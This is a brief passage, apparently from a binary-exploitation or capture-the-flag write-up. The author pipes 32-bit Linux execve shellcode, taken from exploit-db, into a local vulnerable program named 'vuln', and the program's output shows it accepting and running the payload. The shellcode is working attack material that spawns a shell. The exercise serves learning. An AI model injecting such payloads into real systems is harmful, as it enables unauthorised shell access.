Well, don't need think so much, let's find some shellcode online!

From https://www.exploit-db.com/exploits/42428:
```
$ python -c 'print(b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'|./vuln
Enter your shellcode:
1��Ph//shh/bin��PS��

Thanks! Executing now...
```
